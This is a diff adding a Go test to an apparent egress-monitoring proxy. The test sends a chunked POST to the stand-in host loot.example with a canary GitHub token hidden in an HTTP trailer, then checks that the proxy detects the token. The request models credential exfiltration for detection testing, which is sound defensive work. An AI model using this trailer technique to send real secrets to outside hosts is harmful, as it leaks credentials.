@@ -787,3 +787,33 @@ func TestDroppedPacketsAreRecordedUpToTheirBound(t *testing.T) {
 		t.Errorf("dropped = %+v", d)
 	}
 }
+
+func TestACanaryInAnHTTPTrailerIsFound(t *testing.T) {
+	ca := newCA(t)
+	rec := newRecorded()
+	e := New(Config{CA: ca, Upstream: &fakeUpstream{}})
+	e.Observe(rec.observe)
+	e.SetCanaries(testCanaries)
+	proxy := httptest.NewServer(e.Proxy())
+	t.Cleanup(proxy.Close)
+	// A body of unknown length is sent chunked, with the trailer after it.
+	body := io.MultiReader(strings.NewReader("hello"))
+	req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, "http://loot.example/up", body)
+	if err != nil {
+		t.Fatal(err)
+	}
+	req.Trailer = http.Header{"X-K": {testCanaries.Get(canary.GitHubToken)}}
+	resp, err := proxyClient(proxy.URL, ca).Do(req)
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, _ = io.Copy(io.Discard, resp.Body)
+	_ = resp.Body.Close()
+	obs := rec.of(KindHTTP)
+	if len(obs) != 1 {
+		t.Fatalf("http observations = %+v", obs)
+	}
+	if d, _ := obs[0].(HTTPDetail); !slices.Contains(d.Canaries, findings.Match{Canary: canary.GitHubToken, Encoding: findings.Plain}) {
+		t.Errorf("canaries = %+v, want the token in the trailer", d.Canaries)
+	}
+}
